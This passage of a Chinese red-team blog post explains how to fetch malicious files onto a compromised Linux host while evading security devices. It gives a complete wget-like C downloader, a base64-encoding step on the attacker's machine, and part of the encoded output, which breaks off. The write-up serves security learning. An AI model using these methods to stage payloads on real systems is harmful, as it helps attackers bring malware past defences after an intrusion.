@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="e1iwRhdDRUGkBandwtaXVgqhNwYn1qtFuAYbOSPWpcI">
+  <meta name="baidu-site-verification" content="code-NObBqxefR1">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="躁胜寒，静胜热，清静为天下正。 ——《道德经》   在进行红队测试的时候，假如获取到一个linux服务的RCE漏洞，我们可能需要绕过安全设备下载恶意文件，并运行。因此，总结几种手法来下载恶意文件。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux下载远程恶意文件">
+<meta property="og:url" content="http://example.com/linux%E4%B8%8B%E8%BD%BD%E8%BF%9C%E7%A8%8B%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/index.html">
+<meta property="og:site_name" content="Vinci">
+<meta property="og:description" content="躁胜寒，静胜热，清静为天下正。 ——《道德经》   在进行红队测试的时候，假如获取到一个linux服务的RCE漏洞，我们可能需要绕过安全设备下载恶意文件，并运行。因此，总结几种手法来下载恶意文件。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-02-14T10:06:47.000Z">
+<meta property="article:modified_time" content="2022-06-10T12:31:18.718Z">
+<meta property="article:author" content="Vinci">
+<meta property="article:tag" content="Linux安全">
+<meta property="article:tag" content="红队技术">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/linux%E4%B8%8B%E8%BD%BD%E8%BF%9C%E7%A8%8B%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>linux下载远程恶意文件 | Vinci</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Vinci</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Nothing</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/linux%E4%B8%8B%E8%BD%BD%E8%BF%9C%E7%A8%8B%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="Vinci">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Vinci">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          linux下载远程恶意文件
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-14 18:06:47" itemprop="dateCreated datePublished" datetime="2022-02-14T18:06:47+08:00">2022-02-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-10 20:31:18" itemprop="dateModified" datetime="2022-06-10T20:31:18+08:00">2022-06-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">红队技术</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><font style="color:Gray; float:left">躁胜寒，静胜热，清静为天下正。</font><br></p>
+<p><font style="color:Gray; float:right">——《道德经》</font></p>
+<br>
+
+<p>在进行红队测试的时候，假如获取到一个linux服务的RCE漏洞，我们可能需要绕过安全设备下载恶意文件，并运行。因此，总结几种手法来下载恶意文件。</p>
+<span id="more"></span>
+
+
+
+<h2 id="编译c代码下载"><a href="#编译c代码下载" class="headerlink" title="编译c代码下载"></a>编译c代码下载</h2><p>如下c代码类似于wget命令。</p>
+<ul>
+<li>shadowget.c</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 获取http头部信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param fd [in] 	sock套接字</span></span><br><span class="line"><span class="comment"> * @param buf [in] 	存放http头部信息缓冲区</span></span><br><span class="line"><span class="comment"> * @param bufLen [in] 	缓冲区长度</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return 成功：http头部/失败：-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHttpHead</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> bufLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> tmp[<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> nbytes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>((nbytes=recv(fd,tmp,<span class="number">1</span>, <span class="number">0</span>))==<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(offset &gt; bufLen<span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> bufLen;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(i &lt; <span class="number">4</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(tmp[<span class="number">0</span>] == <span class="string">&#x27;\r&#x27;</span> || tmp[<span class="number">0</span>] == <span class="string">&#x27;\n&#x27;</span>) i++;</span><br><span class="line">			<span class="keyword">else</span> i = <span class="number">0</span>;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">strncpy</span>(buf+offset, tmp, <span class="number">1</span>);</span><br><span class="line">			offset++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(<span class="number">4</span> == i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> offset;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 与URL建立连接，并获取sock_fd</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param url [in] 	URL地址</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return sock_fd</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geturl</span><span class="params">(<span class="keyword">char</span>* url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>			cfd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>	<span class="title">cadd</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>		*<span class="title">pURL</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span>			host[BUFSIZE], GET[BUFSIZE];</span><br><span class="line">	<span class="keyword">char</span>			request[BUFSIZE];</span><br><span class="line">	<span class="keyword">char</span>			text[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//分离主机中的主机地址和相对路径</span></span><br><span class="line">	<span class="built_in">memset</span>(host, <span class="number">0</span>, BUFSIZE);</span><br><span class="line">	<span class="built_in">memset</span>(GET, <span class="number">0</span>, BUFSIZE);</span><br><span class="line">	<span class="built_in">memset</span>(request, <span class="number">0</span>, BUFSIZE);</span><br><span class="line">	<span class="built_in">memset</span>(text, <span class="number">0</span>, BUFSIZE);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">sscanf</span>(url, <span class="string">&quot;%*[^//]//%[^/]%s&quot;</span>, host, GET);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;GET = %s\n&quot;</span>, GET);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;host = %s\n&quot;</span>, host);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;url = %s\n&quot;</span>, url);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置socket参数</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">-1</span> == (cfd = socket( AF_INET, SOCK_STREAM, <span class="number">0</span>)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( <span class="string">&quot;create socket failed of client!\n&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将上面获得的主机信息通过域名解析函数获得域名信息</span></span><br><span class="line">	pURL = gethostbyname(host);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置IP地址结构</span></span><br><span class="line">	bzero(&amp;cadd, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">	cadd.sin_family			= AF_INET;</span><br><span class="line">	cadd.sin_addr.s_addr	= *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)pURL-&gt;h_addr_list[<span class="number">0</span>]);</span><br><span class="line">	cadd.sin_port			= htons(<span class="number">80</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//向HTTP服务器发送URL信息</span></span><br><span class="line">	<span class="built_in">snprintf</span>(request, BUFSIZE, 		\</span><br><span class="line">				<span class="string">&quot;GET %s HTTP/1.1\r\n&quot;</span></span><br><span class="line">				<span class="string">&quot;HOST: %s\r\n&quot;</span></span><br><span class="line">				<span class="string">&quot;Cache-Control: no-cache\r\n&quot;</span></span><br><span class="line">				<span class="string">&quot;Connection: close\r\n\r\n&quot;</span>,</span><br><span class="line">				GET,host);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nrequest = \n%s\n&quot;</span>, request);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//连接服务器</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">-1</span> == connect(cfd, (struct sockaddr *)&amp;cadd, (<span class="keyword">socklen_t</span>)<span class="keyword">sizeof</span>(cadd)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( <span class="string">&quot;connect failed of client!\n&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//向服务器发送url请求的request</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">-1</span> ==send(cfd, request, <span class="built_in">strlen</span>( request ), <span class="number">0</span> ))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( <span class="string">&quot;向服务器发送请求的request失败!\n&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//客户端接收服务器的返回信息</span></span><br><span class="line">	getHttpHead(cfd, text, <span class="keyword">sizeof</span>(text));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;head = :\n%s\n&quot;</span>, text);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> cfd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 获取URL中的文件名</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param URLPath [in] 	URL地址</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return 文件名</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">GetFileName</span><span class="params">(<span class="keyword">char</span> *URLPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> *q = <span class="built_in">strrchr</span>(URLPath, ch) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sockfd = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">char</span>		buf[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span>		fileName[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span>			fd = <span class="number">-1</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( argc &lt; <span class="number">2</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( <span class="string">&quot;用法:%s url网页网址\n&quot;</span>, argv[<span class="number">0</span>] );</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">strncpy</span>(fileName, GetFileName(argv[<span class="number">1</span>]), BUFSIZE);</span><br><span class="line">	sockfd = geturl(argv[<span class="number">1</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fileName = %s\n&quot;</span>, fileName);</span><br><span class="line">	remove(fileName);</span><br><span class="line">	</span><br><span class="line">	fd = open(fileName, O_WRONLY | O_CREAT, <span class="number">777</span> );</span><br><span class="line">	<span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror( <span class="string">&quot;OPen error&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memset</span>( buf, <span class="number">0</span>, BUFSIZE );</span><br><span class="line">		<span class="keyword">int</span> cr;</span><br><span class="line">		cr = recv(sockfd, buf, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> ( cr &lt;= <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;break\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		write(fd, buf, cr);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	close(fd);</span><br><span class="line">	close(sockfd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们在攻击机上将其转为base64文件</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shadowget.c <span class="string">| base64 &gt; shadowget.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">I2luY2x1ZGUgPHN0ZGlvLmg</span>+CiNpbmNsdWRlIDx<span class="number">1</span>bmlzdGQuaD<span class="number">4</span>KI<span class="number">2</span>luY<span class="number">2</span>x<span class="number">1</span>ZGUgPGZjbnRsLmg+</span><br><span class="line"><span class="attribute">CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPG5ldGRiLmg</span>+CgojZGVmaW<span class="number">5</span>lIEJVRlNJWkUg</span><br><span class="line"><span class="attribute">MTAyNAoKLyoqCiAqIEBicmllZiDojrflj5ZodHRw5aS06YOo5L</span>+h<span class="number">5</span>oGvCiAqCiAqIEBwYXJhbSBm</span><br><span class="line"><span class="attribute">ZCBbaW5dIAlzb2Nr5aWX5o6l5a2XCiAqIEBwYXJhbSBidWYgW2luXSAJ5a2Y5pS</span>+aHR<span class="number">0</span>cOWktOmD</span><br><span class="line"><span class="attribute">qOS</span>/oeaBr+e<span class="number">8</span>k+WGsuWMugogKiBAcGFyYW<span class="number">0</span>gYnVmTGVuIFtpbl<span class="number">0</span>gCee<span class="number">8</span>k+WGsuWMuumVv+W<span class="number">6</span>pgog</span><br><span class="line"><span class="attribute">KgogKiBAcmV0dXJuIOaIkOWKn</span>++<span class="number">8</span>mmh<span class="number">0</span>dHDlpLTpg<span class="number">6</span>gv<span class="number">5</span>aSx<span class="number">6</span>LSl<span class="number">77</span>yaLTEKICovCmludCBnZXRI</span><br><span class="line"><span class="attribute">dHRwSGVhZChpbnQgZmQsIGNoYXIgKmJ1ZiwgaW50IGJ1ZkxlbikKewoJY2hhciB0bXBbMV0gPSB7</span></span><br><span class="line"><span class="attribute">MH07CglpbnQgaSA9IDA7CglpbnQgb2Zmc2V0ID0gMDsKCWludCBuYnl0ZXMgPSAwOwoKCXdoaWxl</span></span><br><span class="line"><span class="attribute">KChuYnl0ZXM9cmVjdihmZCx0bXAsMSwgMCkpPT0xKQoJewoJCWlmKG9mZnNldCA</span>+IGJ<span class="number">1</span>Zkxlbi<span class="number">0</span>x</span><br><span class="line"><span class="attribute">KQoJCXsKCQkJcmV0dXJuIGJ1ZkxlbjsKCQl9CgkJCgkJaWYoaSA8IDQpCgkJewoJCQlpZih0bXBb</span></span><br><span class="line"><span class="attribute">MF0gPT0gJ1xyJyB8fCB0bXBbMF0gPT0gJ1xuJykgaSsrOwoJCQllbHNlIGkgPSAwOwoJCQkKCQkJ</span></span><br><span class="line"><span class="attribute">c3RybmNweShidWYrb2Zmc2V0LCB0bXAsIDEpOwoJCQlvZmZzZXQrKzsKCQl9CgkJCgkJaWYoNCA9</span></span><br><span class="line"><span 